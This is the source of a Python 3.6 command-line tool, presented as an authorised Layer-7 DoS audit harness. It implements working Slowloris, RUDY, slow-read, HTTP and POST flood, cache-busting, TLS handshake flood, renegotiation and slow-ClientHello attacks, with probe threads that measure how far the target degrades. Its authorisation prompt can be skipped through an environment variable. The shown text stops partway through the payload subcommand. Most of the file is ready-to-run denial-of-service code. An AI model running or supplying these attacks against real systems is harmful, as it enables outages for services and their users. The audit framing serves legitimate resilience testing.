"""
l7_audit_py36.py - Multi-technique Layer-7 DoS audit harness (Python 3.6+).

Same behaviour and CLI as l7_audit.py, with type hints and stdlib calls
adjusted to run on Python 3.6 (typical of locked-down jump boxes that still
ship the system Python from older RHEL/Ubuntu LTS releases).

Subcommands (all live-testable L7 families):
  slow-headers   Slowloris (drip header bytes).
  slow-body      RUDY (slow POST body drip).
  slow-read      Slow read (tiny TCP receive window).
  http-flood     High-rate GET flood.
  cache-bust     GET flood with random query strings (CDN cache bypass).
  post-flood     High-rate POST flood with configurable body.
  payload        Single-payload algorithmic test (ReDoS, billion-laughs, etc.).
"""

import argparse
import datetime as dt
import http.client
import json
import logging
import os
import random
import shutil
import socket
import ssl
import string
import struct
import subprocess
import sys
import threading
import time
import urllib.request
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]


# ----------------------------------------------------------------------------
# Shared infrastructure
# ----------------------------------------------------------------------------


def confirm_authorisation(host, technique):
    # type: (str, str) -> None
    # Orchestrator bypass: env var must exactly match host (set per-run by l7_auto.py).
    if os.environ.get("L7_AUDIT_CONFIRMED") == host:
        print("\nTECHNIQUE: {} (authorisation pre-confirmed for {})".format(technique, host))
        return
    print("\nTECHNIQUE: {}".format(technique))
    print("TARGET:    {}".format(host))
    print("Run only against systems you own or have written authorisation")
    print("to test (signed Rules of Engagement).\n")
    typed = input('Type the target host ("{}") to confirm authorisation: '.format(host)).strip()
    if typed != host:
        print("Confirmation did not match. Aborting.")
        sys.exit(1)


def setup_evidence(host, technique, evidence_dir):
    # type: (str, str, str) -> Tuple[logging.Logger, Path, Path, str]
    d = Path(evidence_dir)
    d.mkdir(parents=True, exist_ok=True)
    run_id = dt.datetime.now().strftime("%Y%m%dT%H%M%S")
    base = d / "{}_{}_{}".format(technique, host, run_id)
    log_path = base.with_suffix(".log")
    jsonl_path = base.with_suffix(".jsonl")

    # logging.basicConfig(force=True) is 3.8+. Clear handlers manually for 3.6.
    root = logging.getLogger()
    for h in list(root.handlers):
        root.removeHandler(h)
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[logging.FileHandler(str(log_path)), logging.StreamHandler()],
    )
    return logging.getLogger(technique), jsonl_path, log_path, run_id


def _make_ctx(insecure):
    # type: (bool) -> ssl.SSLContext
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


def probe(host, port, use_tls, path="/", insecure=False):
    # type: (str, int, bool, str, bool) -> Tuple[bool, float]
    start = time.monotonic()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        if use_tls:
            s = _make_ctx(insecure).wrap_socket(s, server_hostname=host)
        req = "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(path, host)
        s.send(req.encode())
        data = s.recv(64)
        s.close()
        return (bool(data), time.monotonic() - start)
    except OSError as e:
        logging.debug("probe failed: %s", e)
        return (False, time.monotonic() - start)


class ProbeThread(threading.Thread):
    """Background probe at fixed interval, writes JSONL evidence."""

    def __init__(self, host, port, tls, interval, jsonl_path, get_state, stop_event,
                 insecure=False):
        # type: (str, int, bool, int, Path, Callable[[], Dict], threading.Event, bool) -> None
        super().__init__()
        self.daemon = True
        self.host, self.port, self.tls = host, port, tls
        self.interval = interval
        self.jsonl_path = jsonl_path
        self.get_state = get_state
        self.stop_event = stop_event
        self.insecure = insecure
        self.start_time = time.monotonic()

    def run(self):
        with open(str(self.jsonl_path), "w") as f:
            while not self.stop_event.is_set():
                ok, latency = probe(self.host, self.port, self.tls, insecure=self.insecure)
                event = {
                    "ts": dt.datetime.now().isoformat(),
                    "elapsed_s": round(time.monotonic() - self.start_time, 2),
                    "probe_responded": ok,
                    "probe_latency_s": round(latency, 3),
                }
                event.update(self.get_state())
                f.write(json.dumps(event) + "\n")
                f.flush()
                state = "OK" if ok else "DEGRADED/DOWN"
                logging.info("probe %s latency=%.2fs %s",
                             state, latency, self.get_state())
                if self.stop_event.wait(self.interval):
                    break


_CONNECT_ERR_SEEN = {"count": 0, "last": None}


def open_raw_socket(host, port, use_tls, timeout=4, insecure_tls=False):
    # type: (str, int, bool, float, bool) -> Optional[socket.socket]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if use_tls:
            s = _make_ctx(insecure_tls).wrap_socket(s, server_hostname=host)
        return s
    except OSError as e:
        # Log first occurrence and every 50th after that, so you SEE failures
        # but don't drown the log when the target is genuinely down.
        msg = "{}: {}".format(type(e).__name__, e)
        _CONNECT_ERR_SEEN["count"] += 1
        if _CONNECT_ERR_SEEN["count"] == 1 or msg != _CONNECT_ERR_SEEN["last"] \
                or _CONNECT_ERR_SEEN["count"] % 50 == 0:
            logging.warning("connect failed %s:%s tls=%s [%d so far] %s",
                            host, port, use_tls, _CONNECT_ERR_SEEN["count"], msg)
            _CONNECT_ERR_SEEN["last"] = msg
        return None


# ----------------------------------------------------------------------------
# Slow-attack subcommands
# ----------------------------------------------------------------------------


def cmd_slow_headers(a):
    confirm_authorisation(a.host, "slow-headers")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-headers", a.evidence_dir)
    stop = threading.Event()
    sockets = []  # type: List[socket.socket]

    def open_one():
        s = open_raw_socket(a.host, a.port, a.tls, insecure_tls=a.insecure)
        if not s:
            return None
        try:
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 9999)).encode())
            s.send("Host: {}\r\n".format(a.host).encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d", len(sockets), a.sockets)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop,
                          insecure=a.insecure)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                s = open_one()
                if s:
                    alive.append(s)
                else:
                    break
            sockets = alive
            log.info("keepalive cycle: held=%d", len(sockets))
            time.sleep(a.keepalive_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


def cmd_slow_body(a):
    confirm_authorisation(a.host, "slow-body")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-body", a.evidence_dir)
    stop = threading.Event()
    sockets = []  # type: List[socket.socket]

    def open_one():
        s = open_raw_socket(a.host, a.port, a.tls, insecure_tls=a.insecure)
        if not s:
            return None
        try:
            s.send("POST {} HTTP/1.1\r\n".format(a.path).encode())
            s.send("Host: {}\r\n".format(a.host).encode())
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode())
            s.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
            s.send("Content-Length: {}\r\n\r\n".format(a.content_length).encode())
            s.send(b"a")
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d path=%s", len(sockets), a.sockets, a.path)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop,
                          insecure=a.insecure)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.send(b"a")
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                s = open_one()
                if s:
                    alive.append(s)
                else:
                    break
            sockets = alive
            log.info("drip cycle: held=%d", len(sockets))
            time.sleep(a.keepalive_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


def cmd_slow_read(a):
    confirm_authorisation(a.host, "slow-read")
    log, jsonl, _, _ = setup_evidence(a.host, "slow-read", a.evidence_dir)
    stop = threading.Event()
    sockets = []  # type: List[socket.socket]

    def open_one():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, a.recv_buf)
            s.settimeout(4)
            s.connect((a.host, a.port))
            if a.tls:
                s = _make_ctx(a.insecure).wrap_socket(s, server_hostname=a.host)
            req = (
                "GET {} HTTP/1.1\r\n"
                "Host: {}\r\n"
                "User-Agent: {}\r\n"
                "Accept: */*\r\n"
                "Connection: keep-alive\r\n\r\n"
            ).format(a.path, a.host, random.choice(USER_AGENTS))
            s.send(req.encode())
            return s
        except OSError:
            return None

    for _ in range(a.sockets):
        s = open_one()
        if s:
            sockets.append(s)
    log.info("initial sockets held=%d/%d recv_buf=%d", len(sockets), a.sockets, a.recv_buf)

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl,
                          lambda: {"held_sockets": len(sockets)}, stop,
                          insecure=a.insecure)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for s in sockets:
                try:
                    s.settimeout(0.1)
                    try:
                        _ = s.recv(1)
                    except (socket.timeout, ssl.SSLWantReadError):
                        pass
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                s = open_one()
                if s:
                    alive.append(s)
                else:
                    break
            sockets = alive
            log.info("slow-read cycle: held=%d", len(sockets))
            time.sleep(a.read_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


# ----------------------------------------------------------------------------
# High-rate flood subcommands
# ----------------------------------------------------------------------------


_FLOOD_ERR_SEEN = {"count": 0, "last": None}


def _flood_worker(host, port, tls, method, path_fn, body_fn, headers,
                  stop_event, counters, rate_limiter, insecure=False):
    while not stop_event.is_set():
        rate_limiter.wait()
        path = path_fn()
        body = body_fn() if body_fn else None
        start = time.monotonic()
        try:
            if tls:
                conn = http.client.HTTPSConnection(host, port, timeout=10,
                                                   context=_make_ctx(insecure))
            else:
                conn = http.client.HTTPConnection(host, port, timeout=10)
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            _ = resp.read(256)
            counters["requests"] += 1
            key = "status_" + str(resp.status)
            counters[key] = counters.get(key, 0) + 1
            counters["latency_sum"] += time.monotonic() - start
            conn.close()
        except (OSError, http.client.HTTPException) as e:
            counters["errors"] += 1
            msg = "{}: {}".format(type(e).__name__, e)
            _FLOOD_ERR_SEEN["count"] += 1
            if _FLOOD_ERR_SEEN["count"] == 1 or msg != _FLOOD_ERR_SEEN["last"] \
                    or _FLOOD_ERR_SEEN["count"] % 100 == 0:
                logging.warning("request failed [%d so far] %s",
                                _FLOOD_ERR_SEEN["count"], msg)
                _FLOOD_ERR_SEEN["last"] = msg


class TokenBucket(object):
    """Simple token bucket so flood RPS is bounded (audit, not stress-to-death)."""

    def __init__(self, rps):
        # type: (float) -> None
        self.rps = rps
        self.tokens = rps
        self.lock = threading.Lock()
        self.last = time.monotonic()

    def wait(self):
        while True:
            with self.lock:
                now = time.monotonic()
                self.tokens = min(self.rps, self.tokens + (now - self.last) * self.rps)
                self.last = now
                if self.tokens >= 1:
                    self.tokens -= 1
                    return
            time.sleep(0.005)


def _run_flood(a, technique, method, path_fn, body_fn, extra_headers=None):
    confirm_authorisation(a.host, technique)
    log, jsonl, _, _ = setup_evidence(a.host, technique, a.evidence_dir)
    stop = threading.Event()
    counters = {"requests": 0, "errors": 0, "latency_sum": 0.0}
    headers = {"Host": a.host, "User-Agent": random.choice(USER_AGENTS),
               "Connection": "close"}
    if extra_headers:
        headers.update(extra_headers)
    bucket = TokenBucket(a.rps)

    workers = []
    for _ in range(a.workers):
        t = threading.Thread(target=_flood_worker,
                             args=(a.host, a.port, a.tls, method, path_fn, body_fn,
                                   headers, stop, counters, bucket),
                             kwargs={"insecure": a.insecure})
        t.daemon = True
        t.start()
        workers.append(t)

    def state():
        n = counters["requests"] or 1
        return {"requests": counters["requests"], "errors": counters["errors"],
                "avg_latency_s": round(counters["latency_sum"] / n, 3)}

    probe_t = ProbeThread(a.host, a.port, a.tls, a.probe_interval, jsonl, state, stop,
                          insecure=a.insecure)
    probe_t.start()

    log.info("flood started rps=%s workers=%s duration=%ds",
             a.rps, a.workers, a.duration)
    try:
        time.sleep(a.duration)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        for t in workers:
            t.join(timeout=2)
        probe_t.join(timeout=2)
        log.info("totals=%s evidence=%s", state(), jsonl)


def cmd_http_flood(a):
    _run_flood(a, "http-flood", "GET", lambda: a.path, None)


def cmd_cache_bust(a):
    sep = "&" if "?" in a.path else "?"

    def path_fn():
        token = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(12))
        return "{}{}_cb={}".format(a.path, sep, token)

    _run_flood(a, "cache-bust", "GET", path_fn, None,
               extra_headers={"Cache-Control": "no-cache", "Pragma": "no-cache"})


def cmd_post_flood(a):
    body = Path(a.body_file).read_bytes() if a.body_file else b""
    extra = {"Content-Type": a.content_type, "Content-Length": str(len(body))}
    _run_flood(a, "post-flood", "POST", lambda: a.path, lambda: body, extra_headers=extra)


# ----------------------------------------------------------------------------
# TLS handshake flood
# ----------------------------------------------------------------------------


_TLS_ERR_SEEN = {"count": 0, "last": None}


def cmd_tls_handshake_flood(a):
    """Open TCP, complete full TLS handshake, disconnect immediately. Repeat at rate.

    Pure asymmetric-crypto burn on the server. No HTTP is sent — completes
    before any application-layer processing, so auth state is irrelevant.

    Effective when:
      - TLS terminates at origin (no CDN/scrubbing offload)
      - Session resumption is disabled / not configured
      - RSA key exchange still in use (vs ECDHE)
      - No per-source connection-rate limit at the edge
    """
    confirm_authorisation(a.host, "tls-handshake-flood")
    log, jsonl, _, _ = setup_evidence(a.host, "tls-handshake-flood", a.evidence_dir)
    stop = threading.Event()
    counters = {
        "handshakes_ok": 0, "handshakes_failed": 0,
        "tcp_errors": 0, "tls_errors": 0,
        "handshake_time_sum": 0.0, "last_hs_ms": 0.0,
    }
    bucket = TokenBucket(a.rps)

    def make_ctx():
        ctx = ssl.create_default_context()
        if a.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        if a.no_resumption:
            # Disable TLS session tickets (RFC 5077). Forces full handshake
            # when the client offers no resumption material.
            ctx.options |= ssl.OP_NO_TICKET
        return ctx

    def worker():
        # One context per worker, optionally one per handshake.
        ctx = make_ctx() if not a.new_context_per_handshake else None
        while not stop.is_set():
            bucket.wait()
            if ctx is None:
                use_ctx = make_ctx()
            else:
                use_ctx = ctx
            sock = None
            try:
                t0 = time.monotonic()
                sock = socket.create_connection((a.host, a.port), timeout=a.connect_timeout)
                wrapped = use_ctx.wrap_socket(sock, server_hostname=a.host,
                                              do_handshake_on_connect=True)
                hs_time = time.monotonic() - t0
                counters["handshakes_ok"] += 1
                counters["handshake_time_sum"] += hs_time
                counters["last_hs_ms"] = round(1000 * hs_time, 1)
                try:
                    wrapped.unwrap()
                except (OSError, ssl.SSLError):
                    pass
                wrapped.close()
            except (OSError, ssl.SSLError) as e:
                counters["handshakes_failed"] += 1
                if isinstance(e, ssl.SSLError):
                    counters["tls_errors"] += 1
                else:
                    counters["tcp_errors"] += 1
                msg = "{}: {}".format(type(e).__name__, e)
                _TLS_ERR_SEEN["count"] += 1
                if _TLS_ERR_SEEN["count"] == 1 or msg != _TLS_ERR_SEEN["last"] \
                        or _TLS_ERR_SEEN["count"] % 100 == 0:
                    logging.warning("handshake failed [%d so far] %s",
                                    _TLS_ERR_SEEN["count"], msg)
                    _TLS_ERR_SEEN["last"] = msg
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass

    workers = []
    for _ in range(a.workers):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        workers.append(t)

    def state():
        n = counters["handshakes_ok"] or 1
        return {
            "handshakes_ok": counters["handshakes_ok"],
            "handshakes_failed": counters["handshakes_failed"],
            "tcp_errors": counters["tcp_errors"],
            "tls_errors": counters["tls_errors"],
            "avg_hs_ms": round(1000 * counters["handshake_time_sum"] / n, 1),
            "last_hs_ms": counters["last_hs_ms"],
        }

    # Probe uses TLS=True regardless (we only test TLS endpoints).
    probe_t = ProbeThread(a.host, a.port, True, a.probe_interval, jsonl, state, stop,
                          insecure=a.insecure)
    probe_t.start()

    log.info("tls-handshake-flood started rps=%s workers=%s no_resumption=%s "
             "new_ctx_per_hs=%s duration=%ds",
             a.rps, a.workers, a.no_resumption, a.new_context_per_handshake, a.duration)
    try:
        time.sleep(a.duration)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        for t in workers:
            t.join(timeout=2)
        probe_t.join(timeout=2)
        log.info("totals=%s evidence=%s", state(), jsonl)


# ----------------------------------------------------------------------------
# TLS renegotiation flood (uses openssl s_client; falls back to noting absence)
# ----------------------------------------------------------------------------


def cmd_tls_reneg_flood(a):
    """Test whether the server allows client-initiated renegotiation in a loop.

    Modern servers SHOULD reject this (RFC 5746 + insecure-reneg disabled
    server-side, mitigation for CVE-2009-3555). Rejection is the positive
    control finding. Acceptance is a critical finding.

    Implementation: uses `openssl s_client` because Python's stdlib `ssl`
    does not expose a stable client-initiated renegotiation API on
    OpenSSL 1.1+. Install openssl-cli on the jump box.
    """
    confirm_authorisation(a.host, "tls-reneg-flood")
    log, jsonl, _, _ = setup_evidence(a.host, "tls-reneg-flood", a.evidence_dir)

    openssl = shutil.which("openssl")
    if not openssl:
        log.error("openssl binary not found on PATH. Install it or use openssl s_client manually:")
        log.error("  openssl s_client -connect %s:%d -servername %s", a.host, a.port, a.host)
        log.error("  then type 'R' (capital) and press Enter to request renegotiation.")
        with open(str(jsonl), "w") as f:
            f.write(json.dumps({"error": "openssl binary not found"}) + "\n")
        sys.exit(2)

    target = "{}:{}".format(a.host, a.port)
    cmd = [openssl, "s_client", "-connect", target, "-servername", a.host, "-quiet"]
    log.info("starting openssl s_client against %s (attempts=%d, interval=%ds)",
             target, a.attempts, a.interval)

    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, bufsize=0)
    except OSError as e:
        log.error("failed to spawn openssl: %s", e)
        sys.exit(2)

    # Give the handshake time to complete.
    time.sleep(2)
    attempted = 0
    try:
        for i in range(a.attempts):
            try:
                proc.stdin.write(b"R\n")
                proc.stdin.flush()
                attempted += 1
                log.info("renegotiation request %d/%d sent", i + 1, a.attempts)
            except (BrokenPipeError, OSError) as e:
                log.warning("stdin write failed at attempt %d: %s", i + 1, e)
                break
            time.sleep(a.interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        try:
            proc.stdin.close()
        except OSError:
            pass
        try:
            out_bytes, _ = proc.communicate(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
            out_bytes, _ = proc.communicate()
    out = out_bytes.decode("utf-8", errors="replace") if out_bytes else ""

    # Classify outcome from openssl output.
    lowered = out.lower()
    if "renegotiat" in lowered and ("reject" in lowered or "alert" in lowered
                                    or "no renegotiation" in lowered):
        verdict = "REJECTED (control working as expected)"
    elif "renegotiating" in lowered and "verify return code" in lowered:
        verdict = "ACCEPTED (CRITICAL FINDING — server allows client-initiated reneg)"
    elif attempted == 0:
        verdict = "NO ATTEMPTS (openssl never connected)"
    else:
        verdict = "UNCLEAR (review openssl_output in evidence)"

    log.info("verdict: %s", verdict)
    log.info("attempts: %d", attempted)
    with open(str(jsonl), "w") as f:
        f.write(json.dumps({
            "attempts": attempted,
            "verdict": verdict,
            "openssl_output_tail": out[-4000:],
        }, indent=2) + "\n")
    log.info("evidence: %s", jsonl)


# ----------------------------------------------------------------------------
# TLS slow handshake (Slowloris targeting the TLS state machine)
# ----------------------------------------------------------------------------


def _build_client_hello(host):
    # type: (str) -> bytes
    """Build a minimal valid TLS 1.2 ClientHello with SNI for the target host."""
    sni_name = host.encode("ascii", errors="ignore")
    sni_entry = b"\x00" + struct.pack(">H", len(sni_name)) + sni_name  # type=hostname
    sni_list = struct.pack(">H", len(sni_entry)) + sni_entry
    sni_ext = b"\x00\x00" + struct.pack(">H", len(sni_list)) + sni_list

    # Single cipher: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (widely supported).
    ciphers = b"\xc0\x2f"

    body = (
        b"\x03\x03"                       # client_version = TLS 1.2
        + os.urandom(32)                  # random
        + b"\x00"                         # session_id length = 0
        + struct.pack(">H", len(ciphers)) + ciphers
        + b"\x01\x00"                     # compression_methods: [null]
        + struct.pack(">H", len(sni_ext)) + sni_ext
    )
    # Handshake header: type=1 (ClientHello), 3-byte length.
    hs_len_3 = struct.pack(">I", len(body))[1:]
    hs = b"\x01" + hs_len_3 + body
    # Record header: type=22 (handshake), version=TLS 1.2, 2-byte length.
    record = b"\x16\x03\x03" + struct.pack(">H", len(hs)) + hs
    return record


def cmd_tls_slow_handshake(a):
    """Open many TCP connections, drip TLS ClientHello bytes slowly.

    Holds the server's TLS handshake-state buffer. Connection never reaches
    HTTP layer — works against ANY TLS endpoint regardless of auth, vhost,
    or application behind it.

    Audit value: tests whether the TLS terminator enforces a handshake
    timeout aggressive enough to defeat slow ClientHello.
    """
    confirm_authorisation(a.host, "tls-slow-handshake")
    log, jsonl, _, _ = setup_evidence(a.host, "tls-slow-handshake", a.evidence_dir)
    stop = threading.Event()
    # Each entry: [socket, bytes_remaining_to_send]
    conns = []  # type: List[list]

    hello = _build_client_hello(a.host)
    log.info("ClientHello size=%d bytes; drip=%d bytes every %ds",
             len(hello), a.drip_bytes, a.drip_interval)

    def open_one():
        try:
            s = socket.create_connection((a.host, a.port), timeout=a.connect_timeout)
            # Send first byte to commit the connection to the TLS state machine.
            s.send(hello[:1])
            return [s, hello[1:]]
        except OSError as e:
            msg = "{}: {}".format(type(e).__name__, e)
            _CONNECT_ERR_SEEN["count"] += 1
            if _CONNECT_ERR_SEEN["count"] == 1 or msg != _CONNECT_ERR_SEEN["last"] \
                    or _CONNECT_ERR_SEEN["count"] % 50 == 0:
                logging.warning("connect failed %s:%s [%d so far] %s",
                                a.host, a.port, _CONNECT_ERR_SEEN["count"], msg)
                _CONNECT_ERR_SEEN["last"] = msg
            return None

    for _ in range(a.sockets):
        e = open_one()
        if e:
            conns.append(e)
    log.info("initial connections held=%d/%d", len(conns), a.sockets)

    probe_t = ProbeThread(a.host, a.port, True, a.probe_interval, jsonl,
                          lambda: {"held_connections": len(conns),
                                   "with_data_to_send":
                                       sum(1 for e in conns if e[1])},
                          stop, insecure=a.insecure)
    probe_t.start()
    start = time.monotonic()

    try:
        while time.monotonic() - start < a.duration:
            alive = []
            for ent in conns:
                s, remaining = ent
                try:
                    if remaining:
                        chunk = remaining[:a.drip_bytes]
                        s.send(chunk)
                        ent[1] = remaining[a.drip_bytes:]
                    alive.append(ent)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            while len(alive) < a.sockets:
                e = open_one()
                if e:
                    alive.append(e)
                else:
                    break
            conns = alive
            log.info("drip cycle: held=%d still_draining=%d",
                     len(conns), sum(1 for x in conns if x[1]))
            time.sleep(a.drip_interval)
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        stop.set()
        probe_t.join(timeout=2)
        for ent in conns:
            try:
                ent[0].close()
            except OSError:
                pass
        log.info("evidence: %s", jsonl)


# ----------------------------------------------------------------------------
# TLS recon (config snapshot, not an attack)
# ----------------------------------------------------------------------------


def cmd_tls_recon(a):
    """Snapshot the target's TLS configuration. NOT an attack.

    For full cipher enumeration use `testssl.sh -p <host>:<port>` or
    `nmap --script ssl-enum-ciphers -p <port> <host>`. This is the
    quick audit-grade snapshot for the workpaper's TLS section.
    """
    confirm_authorisation(a.host, "tls-recon")
    log, jsonl, _, _ = setup_evidence(a.host, "tls-recon", a.evidence_dir)
    report = {"host": a.host, "port": a.port, "tests": {}}

    # 1. Default handshake — what does the server negotiate when client is permissive?
    try:
        ctx = _make_ctx(a.insecure)
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        sock = socket.create_connection((a.host, a.port), timeout=10)
        w = ctx.wrap_socket(sock, server_hostname=a.host)
        d = {
            "version": w.version(),
            "cipher": list(w.cipher()) if w.cipher() else None,
            "compression": w.compression(),
            "selected_alpn": w.selected_alpn_protocol(),
            "session_obtained": getattr(w, "session", None) is not None,
        }
        cert = None
        try:
            cert = w.getpeercert(binary_form=False)
        except (ssl.SSLError, ValueError):
            pass
        if cert:
            d["cert"] = {
                "subject": cert.get("subject"),
                "issuer": cert.get("issuer"),
                "notAfter": cert.get("notAfter"),
                "subjectAltName": cert.get("subjectAltName"),
            }
        report["tests"]["default_handshake"] = d
        w.close()
    except (OSError, ssl.SSLError) as e:
        report["tests"]["default_handshake"] = {"error": "{}: {}".format(type(e).__name__, e)}

    # 2. TLS version enumeration via OP_NO_* flags (3.6-compatible).
    version_probes = [
        ("TLSv1.0", ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2),
        ("TLSv1.1", ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_2),
        ("TLSv1.2", ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1),
    ]
    if hasattr(ssl, "OP_NO_TLSv1_3"):
        for i, (label, opts) in enumerate(version_probes):
            version_probes[i] = (label, opts | ssl.OP_NO_TLSv1_3)
        version_probes.append((
            "TLSv1.3",
            ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2,
        ))
    report["tests"]["version_support"] = {}
    for label, opts in version_probes:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if a.insecure:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            ctx.options |= opts
            sock = socket.create_connection((a.host, a.port), timeout=8)
            w = ctx.wrap_socket(sock, server_hostname=a.host)
            report["tests"]["version_support"][label] = {
                "accepted": True, "negotiated": w.version(),
            }
            w.close()
        except (OSError, ssl.SSLError, NotImplementedError) as e:
            report["tests"]["version_support"][label] = {
                "accepted": False, "error": str(e)[:200],
            }

    # 3. Session resumption — does a second connect reuse the session?
    try:
        ctx = _make_ctx(a.insecure)
        s1 = socket.create_connection((a.host, a.port), timeout=10)
        w1 = ctx.wrap_socket(s1, server_hostname=a.host)
        sess = getattr(w1, "session", None)
        w1.close()
        if sess is None:
            report["tests"]["session_resumption"] = {
                "session_obtained": False,
                "note": "Server did not issue a session ticket / no session object available",
            }
        else:
            s2 = socket.create_connection((a.host, a.port), timeout=10)
            w2 = ctx.wrap_socket(s2, server_hostname=a.host, session=sess)
            report["tests"]["session_resumption"] = {
                "session_obtained": True,
                "session_reused": bool(getattr(w2, "session_reused", False)),
            }
            w2.close()
    except (OSError, ssl.SSLError) as e:
        report["tests"]["session_resumption"] = {"error": "{}: {}".format(type(e).__name__, e)}

    # 4. Cipher class hint — does the negotiated suite use RSA key exchange?
    dh = report["tests"].get("default_handshake", {})
    cipher_info = dh.get("cipher")
    if isinstance(cipher_info, list) and cipher_info:
        name = cipher_info[0]
        rsa_kx = "RSA" in name.split("-")[0:1] or name.startswith("AES") or name.startswith("RC4")
        ecdhe = "ECDHE" in name
        report["tests"]["cipher_class"] = {
            "name": name,
            "key_exchange_likely_rsa": rsa_kx and not ecdhe,
            "perfect_forward_secrecy": ecdhe or "DHE" in name,
        }

    # Write report.
    with open(str(jsonl), "w") as f:
        f.write(json.dumps(report, indent=2, default=str) + "\n")

    # Human summary to log.
    log.info("=== TLS recon summary ===")
    dh = report["tests"].get("default_handshake", {})
    if "error" in dh:
        log.info("Default handshake: FAILED  %s", dh["error"])
    else:
        log.info("Negotiated: version=%s cipher=%s alpn=%s",
                 dh.get("version"),
                 dh.get("cipher")[0] if dh.get("cipher") else None,
                 dh.get("selected_alpn"))
    vs = report["tests"].get("version_support", {})
    if vs:
        log.info("Version support:")
        for v, info in vs.items():
            log.info("  %-9s %s", v, "ACCEPTED" if info.get("accepted") else "rejected")
    sr = report["tests"].get("session_resumption", {})
    if sr:
        log.info("Session resumption: obtained=%s reused=%s",
                 sr.get("session_obtained"), sr.get("session_reused"))
    cc = report["tests"].get("cipher_class", {})
    if cc:
        log.info("Cipher class: %s PFS=%s likely_RSA_kx=%s",
                 cc.get("name"), cc.get("perfect_forward_secrecy"),
                 cc.get("key_exchange_likely_rsa"))
    log.info("Run `testssl.sh -p %s:%d` for full cipher enumeration", a.host, a.port)
    log.info("evidence: %s", jsonl)


# ----------------------------------------------------------------------------
# Algorithmic / payload subcommand
# ----------------------------------------------------------------------------


def cmd_payload(a):
    confirm_authorisation(a.host, "payload")
    log, jsonl, _, _ = setup_evidence(a.host, "payload", a.evidence_dir)
    body = Path(a.payload_file).read_bytes()
    scheme = "https" if a.tls else "http"
    url = "{}://{}:{}{}".format(scheme, a.host, a.port, a.path)

